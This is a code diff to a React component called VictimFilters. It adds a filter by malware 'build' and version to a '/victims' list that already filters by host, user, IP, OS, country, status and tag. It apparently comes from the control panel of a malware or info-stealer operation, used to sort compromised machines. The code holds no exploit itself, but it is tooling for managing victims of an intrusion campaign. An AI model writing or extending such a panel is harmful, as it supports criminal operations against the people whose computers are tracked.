@@ -6,7 +6,7 @@ import { Button } from '@/components/ui/button';
 import { useDebounced } from '@/hooks/useApi';
 import { X } from 'lucide-react';
 
-export function VictimFilters({ countries }: { countries: string[] }) {
+export function VictimFilters({ countries, builds = [] }: { countries: string[]; builds?: Array<{ id: string; name: string; version: string }> }) {
   const router = useRouter();
   const params = useSearchParams();
   const [q, setQ] = useState(params.get('q') ?? '');
@@ -15,6 +15,7 @@ export function VictimFilters({ countries }: { countries: string[] }) {
   const [status, setStatus] = useState(params.get('status') ?? '');
   const [country, setCountry] = useState(params.get('country') ?? '');
   const [tag, setTag] = useState(params.get('tag') ?? '');
+  const [build, setBuild] = useState(params.get('build') ?? '');
 
   useEffect(() => {
     const next = new URLSearchParams(params.toString());
@@ -23,10 +24,11 @@ export function VictimFilters({ countries }: { countries: string[] }) {
     if (status) next.set('status', status); else next.delete('status');
     if (country) next.set('country', country); else next.delete('country');
     if (tag) next.set('tag', tag); else next.delete('tag');
+    if (build) next.set('build', build); else next.delete('build');
     router.replace(`/victims?${next.toString()}`, { scroll: false });
-  }, [debounced, os, status, country, tag]); // eslint-disable-line react-hooks/exhaustive-deps
+  }, [debounced, os, status, country, tag, build]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  const active = Boolean(q || os || status || country || tag);
+  const active = Boolean(q || os || status || country || tag || build);
   return (
     <div className="flex flex-wrap items-center gap-1.5 border-b border-line px-3 py-2">
       <Input value={q} onChange={(event) => setQ(event.target.value)} placeholder="host, user, ip, tag…" className="w-56" />
@@ -41,8 +43,12 @@ export function VictimFilters({ countries }: { countries: string[] }) {
         {countries.map((item) => <option key={item} value={item}>{item}</option>)}
       </Select>
       <Input value={tag} onChange={(event) => setTag(event.target.value)} placeholder="tag" className="w-28" />
+      <Select value={build} onChange={(event) => setBuild(event.target.value)}>
+        <option value="">any build</option>
+        {builds.map((item) => <option key={item.id} value={item.id}>{item.name} v{item.version}</option>)}
+      </Select>
       {active ? (
-        <Button variant="ghost" size="sm" onClick={() => { setQ(''); setOs(''); setStatus(''); setCountry(''); setTag(''); }}>
+        <Button variant="ghost" size="sm" onClick={() => { setQ(''); setOs(''); setStatus(''); setCountry(''); setTag(''); setBuild(''); }}>
           <X className="h-3 w-3" /> clear
         </Button>
       ) : null}
